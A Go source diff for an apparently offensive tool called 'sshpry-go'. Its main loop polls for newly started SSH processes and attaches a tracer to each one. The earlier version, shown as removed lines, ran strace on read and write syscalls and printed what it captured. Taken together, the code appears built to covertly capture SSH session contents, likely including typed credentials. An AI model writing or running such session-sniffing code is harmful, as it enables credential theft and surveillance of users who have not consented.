@@ -2,30 +2,43 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"time"
 
-	"github.com/PatronC2/sshpry-go/strace"
+	"github.com/PatronC2/sshpry-go/pry"
 )
 
 func main() {
-	s := strace.STrace{
-		Flags: map[string]string{
-			"-s": "16384",
-			"-p": "12",
-			"-e": "read,write",
-		},
+	fmt.Println("Monitoring SSH processes...")
+
+	// At program start, capture the existing SSH PIDs
+	initialPids, err := pry.GetSSHProcesses()
+	if err != nil {
+		log.Fatalf("Failed to get initial SSH processes: %v", err)
 	}
 
-	s.Trace()
+	// Store them in a map for quick lookup
+	seenPids := make(map[int]bool)
+	for _, pid := range initialPids {
+		seenPids[pid] = true
+	}
 
 	for {
-		fmt.Printf("Err: %s\n", s.Stderr.String())
-		fmt.Printf("Out: %s\n", s.Stdout.String())
+		sshPids, err := pry.GetSSHProcesses()
+		if err != nil {
+			log.Printf("Error fetching SSH processes: %v", err)
+			time.Sleep(2 * time.Second)
+			continue
+		}
 
-		s.Stderr.Reset()
-		s.Stdout.Reset()
+		for _, pid := range sshPids {
+			if !seenPids[pid] {
+				// New PID we haven't seen yet — start tracing
+				go pry.StartTracing(pid)
+				seenPids[pid] = true // Mark it as seen so we don't start tracing again
+			}
+		}
 
-		time.Sleep(1 * time.Second)
-
+		time.Sleep(2 * time.Second)
 	}
 }
